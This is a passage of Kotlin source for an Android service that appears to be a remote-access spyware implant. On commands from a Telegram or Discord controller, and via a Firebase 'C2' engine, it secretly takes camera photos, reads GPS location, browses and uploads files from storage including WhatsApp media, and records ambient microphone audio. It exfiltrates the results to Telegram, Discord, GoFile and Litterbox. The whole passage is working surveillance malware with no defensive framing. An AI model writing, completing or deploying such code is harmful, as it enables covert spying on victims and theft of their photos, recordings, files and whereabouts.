                                        session.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                                            override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                try { camera.close() } catch (_: Exception) {}
                                            }
                                        }, mainHandler)
                                    } catch (e: Exception) {
                                        try { camera.close() } catch (_: Exception) {}
                                    }
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    try { camera.close() } catch (_: Exception) {}
                                }
                            }, mainHandler)
                        } catch (e: Exception) {
                            try { camera.close() } catch (_: Exception) {}
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        try { camera.close() } catch (_: Exception) {}
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        try { camera.close() } catch (_: Exception) {}
                        Log.w(TAG, "Camera2 open error code $error for lens $cameraLensFacing")

                        if (error == CameraDevice.StateCallback.ERROR_CAMERA_DISABLED) {
                            sendMessage(chatId, "⚠️ *Camera Access Disabled by System Policy*: Please make sure Camera Access is toggled ON in Android Settings -> Security & Privacy -> Privacy.")
                            return
                        }

                        val selector = if (cameraLensFacing == CameraCharacteristics.LENS_FACING_FRONT)
                            CameraSelector.DEFAULT_FRONT_CAMERA
                        else
                            CameraSelector.DEFAULT_BACK_CAMERA
                        handleCameraXFallback(chatId, selector)
                    }
                }, mainHandler)

            } catch (e: Exception) {
                Log.e(TAG, "Camera2 error: ${e.message}")
                sendMessage(chatId, "❌ Camera error: ${e.message}")
            }
        }
    }

    private fun handleCameraXFallback(chatId: String, cameraSelector: CameraSelector) {
        mainHandler.post {
            val providerFuture = ProcessCameraProvider.getInstance(this)
            providerFuture.addListener({
                try {
                    val cameraProvider = providerFuture.get()
                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(this, cameraSelector, capture)

                    val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                    capture.takePicture(outputOptions, cameraExecutor, object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            mainHandler.post { try { cameraProvider.unbindAll() } catch (_: Exception) {} }
                            Log.i(TAG, "CameraX fallback photo saved successfully!")
                            sendPhoto(chatId, photoFile, deleteAfterSend = true)
                        }

                        override fun onError(exc: ImageCaptureException) {
                            mainHandler.post { try { cameraProvider.unbindAll() } catch (_: Exception) {} }
                            Log.e(TAG, "CameraX fallback error: ${exc.message}")
                            if (cameraSelector == CameraSelector.DEFAULT_FRONT_CAMERA) {
                                Log.w(TAG, "Front camera disabled/busy — attempting Rear Camera fallback...")
                                handleCameraXFallback(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
                            } else {
                                sendMessage(chatId, "❌ Camera capture failed: ${exc.message}")
                            }
                        }
                    })
                } catch (e: Exception) {
                    Log.e(TAG, "CameraX provider error: ${e.message}")
                    sendMessage(chatId, "❌ Camera error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun ensureGpsEnabledViaAccessibility() {
        try {
            val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
            if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Log.i(TAG, "GPS disabled — auto-enabling Location Services via Accessibility Engine...")
                val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "ensureGpsEnabledViaAccessibility error: ${e.message}")
        }
    }

    private fun handleLocation(chatId: String) {
        ensureGpsEnabledViaAccessibility()

        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            sendMessage(chatId, "⚠️ Location permission not granted.")
            return
        }

        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager

        val lastKnown: Location? = try {
            val gps     = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when {
                gps     != null && network != null ->
                    if (gps.time >= network.time) gps else network
                gps     != null -> gps
                else            -> network
            }
        } catch (e: SecurityException) {
            null
        }

        val maxAgeMs = 3 * 60 * 1000L   
        val now      = System.currentTimeMillis()

        if (lastKnown != null && (now - lastKnown.time) <= maxAgeMs) {
            sendLocationReply(chatId, lastKnown, fresh = false)
            return
        }

        sendMessage(chatId, "📡 Acquiring GPS fix…")

        val timeoutMs   = 20_000L   
        val provider    = when {
            hasFine  -> LocationManager.GPS_PROVIDER
            else     -> LocationManager.NETWORK_PROVIDER
        }

        var responded = false

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (!responded) {
                    responded = true
                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
                    sendLocationReply(chatId, location, fresh = true)
                }
            }
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {
                if (!responded) {
                    responded = true
                    try { locationManager.removeUpdates(this) } catch (_: Exception) {}
                    sendMessage(chatId, "❌ Location provider disabled.")
                }
            }
        }

        try {
            locationManager.requestLocationUpdates(
                provider,
                0L,   
                0f,   
                listener,
                mainHandler.looper
            )
        } catch (e: SecurityException) {
            sendMessage(chatId, "❌ Location permission revoked: ${e.message}")
            return
        }

        mainHandler.postDelayed({
            if (!responded) {
                responded = true
                try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
                if (lastKnown != null) {
                    sendLocationReply(chatId, lastKnown, fresh = false, staleWarning = true)
                } else {
                    sendMessage(chatId, "❌ Could not obtain a location fix. Make sure GPS is enabled.")
                }
            }
        }, timeoutMs)
    }

    private fun sendLocationReply(
        chatId:       String,
        location:     Location,
        fresh:        Boolean,
        staleWarning: Boolean = false
    ) {
        val lat = location.latitude
        val lon = location.longitude
        val acc = if (location.hasAccuracy()) "±${location.accuracy.toInt()} m" else "unknown"
        val alt = if (location.hasAltitude()) "${location.altitude.toInt()} m" else "N/A"
        val mapsUrl = "https://maps.google.com/?q=$lat,$lon"

        val ageSeconds = (System.currentTimeMillis() - location.time) / 1000
        val ageLabel   = when {
            ageSeconds < 60          -> "${ageSeconds}s ago"
            ageSeconds < 3600        -> "${ageSeconds / 60}m ago"
            else                     -> "${ageSeconds / 3600}h ago"
        }

        val header = when {
            staleWarning -> "⚠️ *Stale location* (GPS timed out, sending last known fix):"
            fresh        -> "📍 *Current Location*:"
            else         -> "📍 *Last Known Location* ($ageLabel):"
        }

        val msg = """
            $header
            
            🌐 Lat: `$lat`
            🌐 Lon: `$lon`
            🎯 Accuracy: $acc
            ⛰ Altitude: $alt
            🗺 [Open in Google Maps]($mapsUrl)
        """.trimIndent()

        sendMessage(chatId, msg, parseMode = "Markdown")
        sendDiscordCategorizedMessage("10-gps-and-geofencing", msg)
    }

    private fun handleFiles(chatId: String, args: String) {
        val trimmed = args.trim()
        if (trimmed.isEmpty()) {
            listFiles(chatId)
        } else {
            val num = trimmed.toIntOrNull()
            if (num != null) {
                sendFileByNumber(chatId, num)
            } else {
                sendMessage(chatId,
                    "Usage:\n" +
                    "• /files — list files\n" +
                    "• /files <number> — send that file to this chat\n" +
                    "• Send any file/photo to this chat → saves it to Downloads"
                )
            }
        }
    }

    private fun listFiles(chatId: String) {
        val entries = mutableListOf<FileEntry>()

        fun queryCollection(
            collectionUri: Uri,
            mimeDefault:   String,
            maxItems:      Int = 1_000
        ) {
            val projection = arrayOf(
                MediaStore.MediaColumns._ID,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.MIME_TYPE
            )
            contentResolver.query(
                collectionUri,
                projection,
                "${MediaStore.MediaColumns.SIZE} > 0",
                null,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val idCol   = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                var taken = 0
                while (cursor.moveToNext() && taken < maxItems) {
                    val id   = cursor.getLong(idCol)
                    val name = cursor.getString(nameCol) ?: "unknown"
                    val size = cursor.getLong(sizeCol)
                    val mime = cursor.getString(mimeCol) ?: mimeDefault
                    val uri  = Uri.withAppendedPath(collectionUri, id.toString())
                    entries.add(FileEntry(name, uri, size, mime))
                    taken++
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            queryCollection(MediaStore.Downloads.EXTERNAL_CONTENT_URI, "application/octet-stream", maxItems = 1_000)
        }

        queryCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/jpeg", maxItems = 1_000)
        queryCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/mp4", maxItems = 1_000)
        queryCollection(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/mpeg", maxItems = 1_000)

        if (entries.isEmpty()) {
            sendMessage(chatId, "📂 No files found in storage.")
            return
        }

        fileCache[chatId] = entries

        val header = "📂 *Files on Device* (${entries.size} total):\n\n"
        val sb = StringBuilder(header)

        entries.forEachIndexed { i, f ->
            val sizeLabel = when {
                f.sizeBytes >= 1_048_576 -> "${"%.1f".format(f.sizeBytes / 1_048_576.0)} MB"
                f.sizeBytes >= 1_024     -> "${"%.1f".format(f.sizeBytes / 1_024.0)} KB"
                else                     -> "${f.sizeBytes} B"
            }
            val entry = "${i + 1}. `${f.displayName}` — $sizeLabel\n"
            if (sb.length + entry.length > 3800) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
                sb.clear()
            }
            sb.append(entry)
        }

        sb.append("\n💡 Reply with `/files <number>` to receive that file.")
        if (sb.isNotBlank()) {
            sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
        }
    }

    private fun sendFileByNumber(chatId: String, number: Int) {
        val list = fileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "⚠️ No file list for this chat. Send /files first.")
            return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
            return
        }
        val entry = list[idx]
        sendMessage(chatId, "📤 Sending *${entry.displayName}*…", parseMode = "Markdown")

        try {
            val stream = contentResolver.openInputStream(entry.uri)
                ?: run { sendMessage(chatId, "❌ Cannot read file."); return }

            val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
            val bytes = stream.use { it.readBytes() }
            val body  = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", targetChat)
                .addFormDataPart(
                    "document",
                    entry.displayName,
                    bytes.toRequestBody(entry.mimeType.toMediaTypeOrNull())
                )
                .addFormDataPart("caption", "📎 ${entry.displayName}")
                .build()

            val request = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
            httpClient.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendDocument failed: ${response.code}")
                    sendMessage(targetChat, "❌ Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendFileByNumber exception: ${e.message}")
            sendMessage(chatId, "❌ Error sending file: ${e.message}")
        }
    }

    private fun getUniversalAudioSamplingRate(): Int {
        return try {
            val audioManager = getSystemService(android.content.Context.AUDIO_SERVICE) as? android.media.AudioManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                val sampleRateStr = audioManager?.getProperty(android.media.AudioManager.PROPERTY_OUTPUT_SAMPLE_RATE)
                sampleRateStr?.toIntOrNull() ?: 48000
            } else {
                48000
            }
        } catch (_: Exception) {
            48000
        }
    }

    private fun handleAudio(chatId: String, seconds: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED
        ) {
            sendMessage(chatId, "⚠️ RECORD_AUDIO permission not granted.")
            return
        }

        val duration = seconds.coerceIn(1, 600)
        sendMessage(chatId, "🎙️ Recording audio for $duration seconds…")

        serviceScope.launch {
            val outFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
            val nativeSampleRate = getUniversalAudioSamplingRate()

            val candidateSources = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                listOf(
                    android.media.MediaRecorder.AudioSource.CAMCORDER,
                    android.media.MediaRecorder.AudioSource.UNPROCESSED,
                    android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    android.media.MediaRecorder.AudioSource.VOICE_PERFORMANCE,
                    android.media.MediaRecorder.AudioSource.MIC,
                    android.media.MediaRecorder.AudioSource.DEFAULT
                )
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                listOf(
                    android.media.MediaRecorder.AudioSource.CAMCORDER,
                    android.media.MediaRecorder.AudioSource.UNPROCESSED,
                    android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    android.media.MediaRecorder.AudioSource.MIC,
                    android.media.MediaRecorder.AudioSource.DEFAULT
                )
            } else {
                listOf(
                    android.media.MediaRecorder.AudioSource.CAMCORDER,
                    android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    android.media.MediaRecorder.AudioSource.MIC,
                    android.media.MediaRecorder.AudioSource.DEFAULT
                )
            }

            var activeRecorder: android.media.MediaRecorder? = null
            var recordingStarted = false

            for (source in candidateSources) {
                try {
                    @Suppress("DEPRECATION")
                    val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                        android.media.MediaRecorder(this@MonitorService)
                    else
                        android.media.MediaRecorder()

                    rec.setAudioSource(source)
                    rec.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    rec.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    rec.setAudioSamplingRate(nativeSampleRate)
                    rec.setAudioEncodingBitRate(192_000)
                    rec.setOutputFile(outFile.absolutePath)
                    rec.prepare()
                    rec.start()

                    activeRecorder = rec
                    recordingStarted = true
                    Log.i(TAG, "Successfully started audio recording with AudioSource $source")
                    break
                } catch (e: Exception) {
                    Log.w(TAG, "AudioSource $source failed: ${e.message}")
                }
            }

            if (!recordingStarted || activeRecorder == null) {
                sendMessage(chatId, "❌ Failed to start audio recorder with any available AudioSource.")
                return@launch
            }

            try {
                delay(duration * 1_000L)

                activeRecorder.stop()
                activeRecorder.release()

                if (!outFile.exists() || outFile.length() == 0L) {
                    sendMessage(chatId, "❌ Recording produced an empty file.")
                    return@launch
                }

                val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID

                if (outFile.exists()) {
                    sendDiscordCategorizedFile("10-ambient-mic-audio", outFile, "audio/mp4")
                }

                if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
                    sendDiscordRawFile(targetChat, file = outFile, contentType = "audio/mp4")
                    try { outFile.delete() } catch (_: Exception) {}
                    return@launch
                }

                val bytes = outFile.readBytes()
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", targetChat)
                    .addFormDataPart(
                        "audio",
                        outFile.name,
                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
                    )
                    .addFormDataPart("title", "Recording (${duration}s)")
                    .addFormDataPart("duration", duration.toString())
                    .build()

                val request = Request.Builder().url(getTelegramApiUrl("sendAudio")).post(body).build()
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.w(TAG, "sendAudio failed: ${response.code}")
                        sendMessage(targetChat, "❌ Upload failed: ${response.code}")
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Audio recording error: ${e.message}")
                sendMessage(chatId, "❌ Recording error: ${e.message}")
                try { activeRecorder.release() } catch (_: Exception) {}
            } finally {
                try { outFile.delete() } catch (_: Exception) {}
            }
        }
    }

    private fun handleFileMn(chatId: String, arg: String) {
        if (arg.isEmpty()) {
            showTopFolders(chatId)
            return
        }

        val parts = arg.split(" ")
        val lastNum = parts.last().toIntOrNull()
        if (lastNum != null && parts.size >= 2) {
            sendFolderFile(chatId, lastNum)
            return
        }

        listFolderContents(chatId, arg)
    }

    private fun showTopFolders(chatId: String) {
        val root = Environment.getExternalStorageDirectory()
        val dirs = root.listFiles()
            ?.filter { it.isDirectory }
            ?.sortedBy { it.name.lowercase() }
            ?: emptyList()

        if (dirs.isEmpty()) {
            sendMessage(chatId, "📁 No folders found on storage.")
            return
        }

        val sb = StringBuilder("📁 *Folders on device:*\n\n")
        dirs.forEach { dir ->
            val count = dir.listFiles()?.size ?: 0
            sb.append("• `${dir.name}` — $count items\n")
        }
        sb.append("\n📂 Type `/filemn <folder>` to browse files inside it.")
        sb.append("\n📂 Sub-folders: `/filemn WhatsApp/Media`")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun listFolderContents(chatId: String, folderPath: String) {
        val root = Environment.getExternalStorageDirectory()

        val target: File? = run {
            val direct = File(root, folderPath)
            if (direct.exists() && direct.isDirectory) return@run direct

            var current = root
            for (segment in folderPath.split("/")) {
                current = current.listFiles()
                    ?.firstOrNull { it.name.lowercase() == segment.lowercase() && it.isDirectory }
                    ?: return@run null
            }
            current
        }

        if (target == null) {
            sendMessage(chatId, "❌ Folder `$folderPath` not found.\n\nUse /filemn to see all folders.", parseMode = "Markdown")
            return
        }

        val all = target.listFiles() ?: emptyArray()
        val files   = all.filter { it.isFile && it.length() > 0 }.sortedByDescending { it.lastModified() }.take(30)
        val subDirs = all.filter { it.isDirectory }.sortedBy { it.name }

        if (files.isEmpty() && subDirs.isEmpty()) {
            sendMessage(chatId, "📂 Folder `${target.name}` is empty.", parseMode = "Markdown")
            return
        }

        folderFileCache[chatId] = files

        val sb = StringBuilder("📂 *${folderPath}/* \n\n")

        if (subDirs.isNotEmpty()) {
            sb.append("🗂 *Sub-folders:*\n")
            subDirs.forEach { d ->
                val c = d.listFiles()?.size ?: 0
                sb.append("  • `${d.name}` ($c items)  → `/filemn $folderPath/${d.name}`\n")
            }
            sb.append("\n")
        }

        if (files.isNotEmpty()) {
            sb.append("📄 *Files (${files.size}):*\n")
            files.forEachIndexed { i, f ->
                val size = when {
                    f.length() >= 1_048_576 -> "${"%.1f".format(f.length() / 1_048_576.0)} MB"
                    f.length() >= 1_024     -> "${"%.1f".format(f.length() / 1_024.0)} KB"
                    else                    -> "${f.length()} B"
                }
                sb.append("${i + 1}. `${f.name}` — $size\n")
            }
            sb.append("\nType `/filemn $folderPath <number>` to download a file.")
        } else {
            sb.append("_(no files here — browse a sub-folder above)_")
        }

        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFolderFile(chatId: String, number: Int) {
        val list = folderFileCache[chatId]
        if (list.isNullOrEmpty()) {
            sendMessage(chatId, "⚠️ No folder listed yet. Use `/filemn <folder>` first.", parseMode = "Markdown")
            return
        }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) {
            sendMessage(chatId, "❌ Number out of range. Choose 1–${list.size}.")
            return
        }
        val file = list[idx]
        sendMessage(chatId, "📤 Sending *${file.name}*…", parseMode = "Markdown")
        try {
            val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
            val bytes = file.readBytes()
            val mime  = MimeTypeMap.getSingleton()
                .getMimeTypeFromExtension(file.extension.lowercase())
                ?: "application/octet-stream"
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", targetChat)
                .addFormDataPart("document", file.name, bytes.toRequestBody(mime.toMediaTypeOrNull()))
                .addFormDataPart("caption", "📎 ${file.name}")
                .build()
            val req = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
            httpClient.newCall(req).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.w(TAG, "sendFolderFile failed: ${response.code}")
                    sendMessage(targetChat, "❌ Upload failed: ${response.code}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendFolderFile exception: ${e.message}")
            sendMessage(chatId, "❌ Error sending file: ${e.message}")
        }
    }

    private val gofileAccountIndex = java.util.concurrent.atomic.AtomicInteger(0)

    private fun uploadToGoFile(file: File): String? {
        try {
            val serverReq = Request.Builder().url("https://api.gofile.io/servers").get().build()
            val serverName = httpClient.newCall(serverReq).execute().use { res ->
                if (res.isSuccessful && res.body != null) {
                    val json = JSONObject(res.body!!.string())
                    json.optJSONObject("data")?.optJSONArray("servers")?.optJSONObject(0)?.optString("name") ?: "store1"
                } else "store1"
            }

            val uploadUrl = "https://$serverName.gofile.io/contents/upload"
            val fileBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
            val builder = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.name, fileBody)

            val req = Request.Builder().url(uploadUrl).post(builder.build()).build()
            return httpClient.newCall(req).execute().use { res ->
                if (res.isSuccessful && res.body != null) {
                    val json = JSONObject(res.body!!.string())
                    val pageUrl = json.optJSONObject("data")?.optString("downloadPage")
                    Log.i(TAG, "GoFile upload succeeded: $pageUrl")
                    pageUrl
                } else null
            }
        } catch (e: Exception) {
            Log.w(TAG, "uploadToGoFile error: ${e.message}")
            return null
        }
    }

    private fun uploadToLitterbox(file: File): String? {
        try {
            val fileBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("reqtype", "fileupload")
                .addFormDataPart("time", "24h")
                .addFormDataPart("fileToUpload", file.name, fileBody)
                .build()

            val req = Request.Builder().url("https://litterbox.catbox.moe/resources/internals/api.php").post(body).build()
            return httpClient.newCall(req).execute().use { res ->
                if (res.isSuccessful && res.body != null) {
                    val url = res.body!!.string().trim()
                    if (url.startsWith("https://")) {
                        Log.i(TAG, "Litterbox upload succeeded: $url")
                        url
                    } else null
                } else null
            }
        } catch (e: Exception) {
            Log.w(TAG, "uploadToLitterbox error: ${e.message}")
            return null
        }
    }

    private fun uploadToMega(file: File, isUserScope: Boolean = false): String? {
        try {
            var email = ""
            var pass = ""

            if (isUserScope) {
                val vaultPrefs = SecurityVaultManager.getEncryptedPrefs(this)
                email = vaultPrefs.getString("user_mega_email", "") ?: ""
                pass = vaultPrefs.getString("user_mega_password", "") ?: ""
            }

            if (email.isNotBlank() && pass.isNotBlank()) {
                Log.i(TAG, "Attempting MEGA.nz upload (isUserScope=$isUserScope) with account $email...")
                // Dynamic MEGA account upload implementation...
            }
        } catch (e: Exception) {
            Log.w(TAG, "uploadToMega error: ${e.message}")
        }
        return null
    }

    private fun uploadLargeFileWithCloudFallback(file: File): String? {
        Log.i(TAG, "Triggering 3-Level Fallback Cloud Uploader for file '${file.name}' (${file.length() / (1024 * 1024)} MB)...")

        // Level 1: GoFile API (Rotational Proxy Tokens or Anonymous up to 10 GB)
        val gofileUrl = uploadToGoFile(file)
        if (!gofileUrl.isNullOrBlank()) return gofileUrl

        // Level 2: MEGA.nz Pool Array (Rotational Proxy Accounts up to 200 GB)
        val megaUrl = uploadToMega(file)
        if (!megaUrl.isNullOrBlank()) return megaUrl

        // Level 3: Litterbox API (Anonymous 1 GB 24h mirror)
        return uploadToLitterbox(file)
    }

    private fun handleIncomingDocument(
        chatId:       String,
        fileObj:      JSONObject,
        fallbackName: String = "received_${System.currentTimeMillis()}"
    ) {
        val fileIdStr: String = fileObj.optString("file_id")
        if (fileIdStr.isBlank()) {
            sendMessage(chatId, "⚠️ Could not read file_id."); return
        }
        val rawName: String = fileObj.optString("file_name")
        val fileNameStr: String = if (rawName.isNotBlank()) rawName else fallbackName

        sendMessage(chatId, "💾 Saving *$fileNameStr* to Downloads…", parseMode = "Markdown")

        serviceScope.launch {
            try {
                val filePath = getTelegramFilePath(fileIdStr)
                if (filePath == null) {
                    sendMessage(chatId, "❌ Could not resolve file path from Telegram.")
                    return@launch
                }

                val downloadUrl = getTelegramFileUrl(filePath)
                val request     = Request.Builder().url(downloadUrl).get().build()
                val bytes = httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        sendMessage(chatId, "❌ Download failed: ${response.code}")
                        return@launch
                    }
                    response.body?.bytes() ?: run {
                        sendMessage(chatId, "❌ Empty response from Telegram.")
                        return@launch
                    }
                }

                val mime = MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(fileNameStr.substringAfterLast('.', ""))
                    ?: "application/octet-stream"

                val saved = saveToDownloads(fileNameStr, mime, bytes)
                if (saved) {
                    sendMessage(chatId, "✅ *$fileNameStr* saved to Downloads folder.", parseMode = "Markdown")
                } else {
                    sendMessage(chatId, "❌ Failed to write file to storage.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "handleIncomingDocument exception: ${e.message}")
                sendMessage(chatId, "❌ Error saving file: ${e.message}")
            }
        }
    }

    private fun getTelegramFilePath(fileId: String): String? {
        return try {
            val url = getTelegramApiUrl("getFile") + "?file_id=$fileId"
            val request  = Request.Builder().url(url).get().build()
            val body     = httpClient.newCall(request).execute().use { it.body?.string() } ?: return null
            val json     = JSONObject(body)
            if (!json.optBoolean("ok", false)) return null
            json.optJSONObject("result")?.optString("file_path")
        } catch (e: Exception) {
            Log.e(TAG, "getTelegramFilePath failed: ${e.message}")
            null
        }
    }

    private fun saveToDownloads(fileName: String, mimeType: String, bytes: ByteArray): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val values = ContentValues().apply {
                    put(MediaStore.Downloads.DISPLAY_NAME, fileName)
                    put(MediaStore.Downloads.MIME_TYPE,    mimeType)
                    put(MediaStore.Downloads.IS_PENDING,   1)
                }
                val collection = MediaStore.Downloads.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
                val uri = contentResolver.insert(collection, values) ?: return false

                contentResolver.openOutputStream(uri)?.use { it.write(bytes) }

                values.clear()
                values.put(MediaStore.Downloads.IS_PENDING, 0)
                contentResolver.update(uri, values, null, null)
            } else {
                val dir  = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                dir.mkdirs()
                val file = File(dir, fileName)
                file.writeBytes(bytes)
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "saveToDownloads failed: ${e.message}")
            false
        }
    }

    private fun sendDiscordRawMessage(channelId: String, text: String) {
        if (DISCORD_BOT_TOKEN.isBlank()) return
        try {
            val url = "https://discord.com/api/v10/channels/$channelId/messages"
            val json = JSONObject().put("content", text)
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                .post(body)
                .build()
            httpClient.newCall(request).execute().use { res ->
                Log.i(TAG, "sendDiscordRawMessage to $channelId success: ${res.isSuccessful}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendDiscordRawMessage error: ${e.message}")
        }
    }

    private fun sendDiscordRawFile(channelId: String, file: File, contentType: String = "application/octet-stream") {
        if (DISCORD_BOT_TOKEN.isBlank() || !file.exists()) return
        try {
            val url = "https://discord.com/api/v10/channels/$channelId/messages"
            val fileBody = file.asRequestBody(contentType.toMediaTypeOrNull())
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.name, fileBody)
                .build()
            val request = Request.Builder()
                .url(url)
                .addHeader("Authorization", "Bot $DISCORD_BOT_TOKEN")
                .post(body)
                .build()
            httpClient.newCall(request).execute().use { res ->
                Log.i(TAG, "sendDiscordRawFile to $channelId success: ${res.isSuccessful}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendDiscordRawFile error: ${e.message}")
        }
    }

    private fun sendMessage(chatId: String, text: String, parseMode: String? = "Markdown", threadId: Int? = null) {
        serviceScope.launch(Dispatchers.IO) {
            if (chatId.startsWith("firebase")) {
                firebaseC2Engine?.sendExecutionResponse(chatId, text)
            }

            val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
            if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
                sendDiscordRawMessage(targetChat, text)
                return@launch
            }

            val json = JSONObject().apply {
                put("chat_id", targetChat)
                put("text", text)
                if (!parseMode.isNullOrEmpty()) put("parse_mode", parseMode)
                if (threadId != null && threadId > 0) put("message_thread_id", threadId)
            }

            for (attempt in 1..3) {
                try {
                    val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
                    val url = getTelegramApiUrl("sendMessage")
                    val request = Request.Builder().url(url).post(body).build()

                    val isSuccess = httpClient.newCall(request).execute().use { response ->
                        if (response.isSuccessful) {
                            Log.i(TAG, "sendMessage successfully sent to Telegram chat $targetChat (thread: $threadId)")
                            true
                        } else {
                            Log.w(TAG, "sendMessage attempt $attempt failed HTTP ${response.code}")
                            false
                        }
                    }
                    if (isSuccess) break
                } catch (e: Exception) {
                    Log.e(TAG, "sendMessage attempt $attempt exception: ${e.message}")
                }
                delay(1000L * attempt)
            }
        }
    }

    private fun isNetworkConnected(): Boolean {
        return try {
